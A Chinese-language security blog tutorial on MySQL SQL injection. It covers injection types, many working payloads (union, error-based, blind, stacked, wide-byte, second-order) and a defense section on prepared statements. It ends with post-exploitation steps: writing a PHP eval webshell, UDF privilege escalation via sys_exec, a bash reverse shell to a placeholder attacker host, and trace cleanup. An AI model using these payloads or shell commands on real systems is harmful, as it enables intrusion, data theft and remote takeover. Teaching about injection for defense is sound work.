---
title: SQLi详解
toc: true
categories:
  - 技术
  - web
date: 2025-05-22 21:00:00
tags:
  - sqli
  - web安全
---

本篇研究 SQL注入（SQL Injection），主要从mysql视角

**SQL 注入（SQLi）** 是一种将恶意 SQL 语句注入到应用程序的数据库查询中的攻击方式，攻击者可利用漏洞读取、修改、删除数据库中的数据，甚至执行数据库系统命令。

------

## 原理

Web 应用接收用户输入后，**直接拼接进 SQL 查询语句中执行**，导致攻击者构造的 SQL 语句也一并被执行。

### 举例：

```php
$username = $_GET['username'];
$sql = "SELECT * FROM users WHERE username = '$username'";
```

若用户输入：

```
admin' -- 
```

实际 SQL 语句变为：

```sql
SELECT * FROM users WHERE username = 'admin' -- '
```

`--` 是注释符，后面的 `'` 被注释掉了，绕过语法限制，成功登录。

------

## 注入类型

| 类型           | 描述                                          |
| -------------- | --------------------------------------------- |
| **联合注入**   | 拼接查询结果                                  |
| **报错注入**   | 利用报错信息获取数据                          |
| **布尔盲注**   | 判断返回内容真假                              |
| **时间盲注**   | 利用 `sleep()` 等时间差探测数据               |
| **堆叠注入**   | 执行多条 SQL 语句（如 `1; DROP TABLE users`） |
| **宽字节注入** | 利用编码差异绕过转义，常见于 GBK 编码场景     |

------

## payload 示例

```sql
-- 登录绕过
' OR 1=1 -- 

-- 联合注入（列数探测）
' UNION SELECT 1,2,3 -- 

-- 报错注入（MySQL）
' AND updatexml(1,concat(0x7e,(SELECT user())),1) -- 

-- 时间盲注
' AND IF(substr((SELECT database()),1,1)='s', SLEEP(5), 0) -- 

-- 堆叠注入（MySQL 默认禁止，SQLServer 允许）
'; DROP TABLE users; --
```

------

## 联合注入

利用 `UNION SELECT` 合并查询结果，将注入数据拼接到返回结果中。

- 页面存在 SQL 查询结果回显
- UNION 查询的字段数要匹配原始查询字段数

```sql
?id=1 UNION SELECT 1,2,3 -- 
```

确定字段数后：

```sql
?id=1 UNION SELECT 1,username,password FROM users -- 
```

------

## 报错注入

### 1️⃣ `updatexml()`

- **作用**：在构造错误的 XPath 表达式时抛出错误信息
- **语法**：`updatexml(xml_target, xpath_expr, new_value)`
- **注入点使用**：

```sql
?id=1 AND updatexml(1,concat(0x7e,(SELECT database())),1)
```

- **结果**：页面返回：

```
XPATH syntax error: '~testdb'
```

------

### 2️⃣ `extractvalue()`

- **作用**：解析 XPath 表达式时产生错误，抛出回显
- **语法**：`extractvalue(xml_target, xpath_expr)`
- **示例**：

```sql
?id=1 AND extractvalue(1,concat(0x7e,(SELECT user())))
```

- **结果**：

```
XPATH syntax error: '~root@localhost'
```

------

### 3️⃣ `floor(rand())` + `group by`

- **原理**：利用 `rand()` 在 `group by` 中的重复值导致唯一键错误
- **示例**：

```sql
?id=1 AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT((SELECT database()), FLOOR(RAND()*2))) -- 
```

- **结果**：页面会报错：

```
Duplicate entry 'testdb1' for key 'group_key'
```

------

### 4️⃣ `geometrycollection()`

- **作用**：使用无效的参数构造几何对象导致错误
- **示例**（MySQL 5.6+）：

```sql
?id=1 AND geometrycollection((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT user()))) AS a))
```

------

### 5️⃣ `exp(~(SELECT ...))`（指数溢出）

- **作用**：利用数学函数溢出制造报错
- **示例**：

```sql
?id=1 AND exp(~(SELECT * FROM (SELECT user()) AS a))
```

------

### 6️⃣ `name_const()`

- **原理**：同样是触发 `Duplicate entry` 错误
- **示例**：

```sql
?id=1 AND (SELECT * FROM (SELECT name_const((SELECT user()),1)) AS a)
```

> 在某些新版本中会被限制使用，需要判断 DB 版本。

------

## 布尔盲注

注入点没有错误信息或回显，通过页面响应内容的“是否变化”判断真假。

```sql
?id=1 AND 1=1    #页面正常
?id=1 AND 1=2    #页面为空或报错
```

**爆破库名第1个字符是否为 `t`：**

```sql
?id=1 AND substr(database(),1,1)='t'
```

------

## 时间盲注（Time-based Blind）

页面响应时间作为反馈机制，利用 sleep 等延迟函数判断条件真假。

```sql
?id=1 AND IF(SUBSTR(user(),1,1)='r', SLEEP(5), 0) -- MySQL
?id=1; WAITFOR DELAY '0:0:5' -- SQLServer
?id=1 AND pg_sleep(5) -- PostgreSQL
```

**爆破一个字符一位一位来，脚本配合即可**

------

## 堆叠注入

一条语句中执行多条 SQL，如：

```sql
?id=1; DROP TABLE users; --
```

- 有时无回显
- 数据库必须支持多语句（如 SQL Server）
- MySQL 默认禁用（`allow_multi_statements=1` 才支持）

------

## 宽字节注入

服务端过滤 `'` 成为 `\'`，但在 GBK 编码下，`\`+字节可能构成一个合法汉字，从而绕过转义。

```sql
输入：%df' or 1=1 --
变成：%df\'
但在 GBK 中 %df\ 构成合法字符
```

用于绕过防护、配合报错或盲注。

## 二次注入

1. 注册账号输入：

```
用户名: admin'-- 
```

后端代码（无过滤）：

```py
db.insert("INSERT INTO users (username, email) VALUES (?, ?)", [username, email])
```

字段存进了数据库
2. 后台根据用户名查找用户：

```sql
query = "SELECT * FROM users WHERE username = '%s'" % username
```

此时拼接结果为：

```sql
SELECT * FROM users WHERE username = 'admin'-- '
```

SQL 逻辑被破坏，可能导致认证绕过或信息泄露。

## 防御方法

| 防御手段                                            | 描述                             |
| --------------------------------------------------- | -------------------------------- |
| 使用 **预编译语句（PreparedStatement）**  #推荐做法 | 参数不会被当作 SQL               |
| 对用户输入进行严格校验                              | 禁止非法字符，如 `'` `;` `--` 等 |
| 最小权限原则                                        | 数据库账号只授予必要权限         |
| 错误信息不外泄                                      | 禁止返回 SQL 错误给用户          |
| 使用 Web 应用防火墙（WAF）                          | 拦截可疑 payload                 |
| 开启日志审计和异常监控                              | 及时发现 SQL 注入行为            |

------

## 预编译示例（安全写法）

**PHP（PDO）示例：**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $_GET['username']]);
```

**Python（SQLite）示例：**

```python
cursor.execute("SELECT * FROM users WHERE id=?", (user_input,))
```

## MySQL 写 WebShell 利用技巧

### 利用 `into outfile`

```sql
SELECT "<?php @eval($_POST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

### 日志写入WebShell

```sql
SET GLOBAL general_log = 'ON';								#开启日志
SET GLOBAL general_log_file = '/var/www/html/shell.php';	#设置日志文件路径
SELECT '<?php @eval($_POST["cmd"]); ?>';					#写入一句话 WebShell
SET GLOBAL general_log = 'OFF';								#关闭日志
```

### UDF提权

mysql配置文件secure_file_priv项设置为空

**UDF** 是 MySQL 允许用户用 C/C++ 编写的动态库（`.so` 或 `.dll` 文件），加载到 MySQL 后可作为函数调用。

通过 UDF，可以执行一些原本 SQL 不支持的功能，比如访问系统级 API。

攻击者利用上传或写入恶意 UDF 文件，实现数据库进程权限的系统命令执行。

利用流程

#### 获取 MySQL 插件目录

```sql
SHOW VARIABLES LIKE 'plugin_dir';
```

记住路径，比如 /usr/lib/mysql/plugin/
#### 上传恶意 .so 文件

攻击者需要一个编译好的 UDF 动态库文件，通常是类似于 [lib_mysqludf_sys.so](https://github.com/mysqludf/lib_mysqludf_sys)，包含可执行系统命令的函数（如 sys_exec）

通过 SQL 注入或数据库访问权限，利用 SELECT ... INTO DUMPFILE 写入这个二进制文件到 plugin_dir

示例：

```sql
SELECT <二进制内容> INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
```

#### 注册 UDF 函数

```sql
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
```

这条语句会将 sys_exec 函数注册进 MySQL，之后就可以在 SQL 里调用。
#### 执行系统命令

```sql
SELECT sys_exec('whoami > /tmp/whoami.txt');
```

或者执行任意命令：

```sql
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/attacker_ip/port 0>&1"');
```

#### 清理痕迹（可选）

删除 UDF 函数

```sql
DROP FUNCTION sys_exec;
```

删除上传的 .so 文件（需系统权限）
